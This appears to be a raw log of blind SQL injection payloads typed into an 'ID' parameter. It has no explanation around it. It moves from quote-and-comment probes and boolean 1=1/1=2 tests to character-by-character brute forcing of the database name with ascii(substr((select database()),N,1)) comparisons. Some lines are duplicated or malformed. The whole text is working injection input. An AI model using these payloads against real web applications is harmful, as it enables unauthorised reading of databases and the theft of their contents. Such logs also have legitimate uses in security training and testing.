ID:5
ID:1
ID:1'-- 
ID:1'and 1=1-- 
ID:1'and 1=1;-- 
ID:1'and 1=2;-- 
ID:-1'and 1=1;-- 
ID:-1'or 1=1;-- 
ID:-1'or ascii(substr((length database()),1,1))>50;-- 
ID:-1'or ascii(substr((length (database())),1,1))>50;-- 
ID:-1'or ascii(substr((length (database())),1,1))>60;-- 
ID:-1'or ascii(substr((length (database())),1,1))>52;-- 
ID:-1'or ascii(substr((length (database())),1,1))>54;-- 
ID:-1'or ascii(substr((length (database())),1,1))>58;-- 
ID:-1'or ascii(substr((length (database())),1,1))>55;-- 
ID:-1'or ascii(substr((length (database())),1,1))>56;-- 
ID:-1'or ascii(substr((select database()),1,1))>56;-- 
ID:-1'or ascii(substr((select database()),1,1))>100;-- 
ID:-1'or substr((length (database())),1,1)>2;-- 
ID:-1'or substr((length (database())),1,1)>8;-- 
ID:-1'or substr((length (database())),1,1)>2;-- 
ID:-1'or substr((length (database())),1,1)=1#
ID:1
ID:1' or ascii(substr(select database(),1,1))>93 -- 
ID:1' or ascii(substr((select database()),1,1))>93 -- 
ID:1' or ascii(substr((select database()),1,1))>93 -- 
ID:1' or ascii(substr((select database()),1,1))>93 -- 
ID:1' or ascii(substr((select database()),1,1))>93 -- 
ID:1' or ascii(substr((select database()),1,1))>93 -- 
ID:1' or ascii(substr((select database()),1,1))>93 -- 
ID:-1'or ascii(substr((select database()),1,1))=97 #
ID:-1'or ascii(substr((select database()),1,1))=98 #
ID:-1'or ascii(substr((select database()),1,1))=99 #
ID:-1'or ascii(substr((select database()),1,1))=100 #
ID:-1'or ascii(substr((select database()),1,1))=101 #
ID:-1'or ascii(substr((select database()),1,1))=102 #
ID:-1'or ascii(substr((select database()),1,1))=103 #
ID:-1'or ascii(substr((select database()),1,1))=104 #
ID:-1'or ascii(substr((select database()),1,1))=97 #
ID:-1'or ascii(substr((select database()),1,1))=98 #
ID:-1'or ascii(substr((select database()),1,1))=99 #
ID:-1'or ascii(substr((select database()),1,1))=100 #
ID:-1'or ascii(substr((select database()),1,1))=101 #
ID:-1'or ascii(substr((select database()),1,1))=102 #
ID:-1'or ascii(substr((select database()),1,1))=103 #
ID:-1'or ascii(substr((select database()),1,1))=104 #
ID:-1'or ascii(substr((select database()),1,1))=105 #
ID:-1'or ascii(substr((select database()),1,1))=106 #
ID:-1'or ascii(substr((select database()),1,1))=107 #
ID:-1'or ascii(substr((select database()),1,1))=108 #
ID:-1'or ascii(substr((select database()),1,1))=109 #
ID:-1'or ascii(substr((select database()),1,1))=110 #
ID:-1'or ascii(substr((select database()),1,1))=111 #
ID:-1'or ascii(substr((select database()),1,1))=112 #
ID:-1'or ascii(substr((select database()),1,1))=113 #
ID:-1'or ascii(substr((select database()),1,1))=114 #
ID:-1'or ascii(substr((select database()),1,1))=115 #
ID:-1'or ascii(substr((select database()),1,1))=116 #
ID:-1'or ascii(substr((select database()),1,1))=117 #
ID:-1'or ascii(substr((select database()),1,1))=118 #
ID:-1'or ascii(substr((select database()),1,1))=119 #
ID:-1'or ascii(substr((select database()),1,1))=120 #
ID:-1'or ascii(substr((select database()),1,1))=121 #
ID:-1'or ascii(substr((select database()),1,1))=122 #
ID:-1'or ascii(substr((select database()),1,1))=48 #
ID:-1'or ascii(substr((select database()),1,1))=49 #
ID:-1'or ascii(substr((select database()),1,1))=50 #
ID:-1'or ascii(substr((select database()),1,1))=51 #
ID:-1'or ascii(substr((select database()),1,1))=52 #
ID:-1'or ascii(substr((select database()),1,1))=53 #
ID:-1'or ascii(substr((select database()),1,1))=54 #
ID:-1'or ascii(substr((select database()),1,1))=55 #
ID:-1'or ascii(substr((select database()),1,1))=56 #
ID:-1'or ascii(substr((select database()),1,1))=57 #
ID:-1'or ascii(substr((select database()),1,1))=65 #
ID:-1'or ascii(substr((select database()),1,1))=66 #
ID:-1'or ascii(substr((select database()),1,1))=67 #
ID:-1'or ascii(substr((select database()),1,1))=68 #
ID:-1'or ascii(substr((select database()),1,1))=69 #
ID:-1'or ascii(substr((select database()),1,1))=70 #
ID:-1'or ascii(substr((select database()),1,1))=71 #
ID:-1'or ascii(substr((select database()),1,1))=72 #
ID:-1'or ascii(substr((select database()),1,1))=73 #
ID:-1'or ascii(substr((select database()),1,1))=74 #
ID:-1'or ascii(substr((select database()),1,1))=75 #
ID:-1'or ascii(substr((select database()),1,1))=76 #
ID:-1'or ascii(substr((select database()),1,1))=77 #
ID:-1'or ascii(substr((select database()),1,1))=78 #
ID:-1'or ascii(substr((select database()),1,1))=79 #
ID:-1'or ascii(substr((select database()),1,1))=80 #
ID:-1'or ascii(substr((select database()),1,1))=81 #
ID:-1'or ascii(substr((select database()),1,1))=82 #
ID:-1'or ascii(substr((select database()),1,1))=83 #
ID:-1'or ascii(substr((select database()),1,1))=84 #
ID:-1'or ascii(substr((select database()),1,1))=85 #
ID:-1'or ascii(substr((select database()),1,1))=86 #
ID:-1'or ascii(substr((select database()),1,1))=87 #
ID:-1'or ascii(substr((select database()),1,1))=88 #
ID:-1'or ascii(substr((select database()),1,1))=89 #
ID:-1'or ascii(substr((select database()),1,1))=90 #
ID:-1'or ascii(substr((select database()),2,1))=97 #
ID:-1'or ascii(substr((select database()),2,1))=98 #
ID:-1'or ascii(substr((select database()),2,1))=99 #
ID:-1'or ascii(substr((select database()),2,1))=100 #
ID:-1'or ascii(substr((select database()),2,1))=101 #
ID:-1'or ascii(substr((select database()),2,1))=102 #
ID:-1'or ascii(substr((select database()),2,1))=103 #
